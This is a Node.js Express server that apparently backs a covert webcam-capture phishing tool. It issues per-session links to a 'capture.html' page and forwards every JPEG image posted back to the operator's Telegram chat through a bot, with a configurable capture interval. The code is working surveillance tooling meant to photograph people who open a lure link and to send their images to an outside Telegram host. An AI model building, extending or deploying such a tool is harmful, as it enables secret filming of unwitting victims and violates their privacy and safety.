const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");
const path = require("path");
const { telegramChatId, captureInterval } = require("./config");
const bot = require("./telegram_handler");
const app = express();

app.use(bodyParser.json({ limit: "10mb" }));
app.use(express.static("public"));

// Load sessions database
let sessions = {};
const dbFile = "./database/sessions.json";

if (fs.existsSync(dbFile)) {
  sessions = JSON.parse(fs.readFileSync(dbFile));
}

// --------------------------------------
// Create new session (generate link)
// --------------------------------------
app.get("/api/create", (req, res) => {
  const id = Math.random().toString(36).substring(2, 10);
  sessions[id] = { created: Date.now(), active: true };

  fs.writeFileSync(dbFile, JSON.stringify(sessions));

  const link = `https://yourdomain.com/capture.html?id=${id}`;
  res.json({ id, link });
});

// --------------------------------------
// Receive captured image
// --------------------------------------
app.post("/api/capture", async (req, res) => {
  const { id, image } = req.body;

  if (!sessions[id]) return res.json({ error: "Invalid session" });

  const base64 = image.replace(/^data:image\/jpeg;base64,/, "");
  const buffer = Buffer.from(base64, "base64");

  await bot.sendPhoto(telegramChatId, buffer, {
    caption: `📸 New image from session ${id}`
  });

  res.json({ status: "ok" });
});

app.listen(3000, () => console.log("Server running on port 3000"));
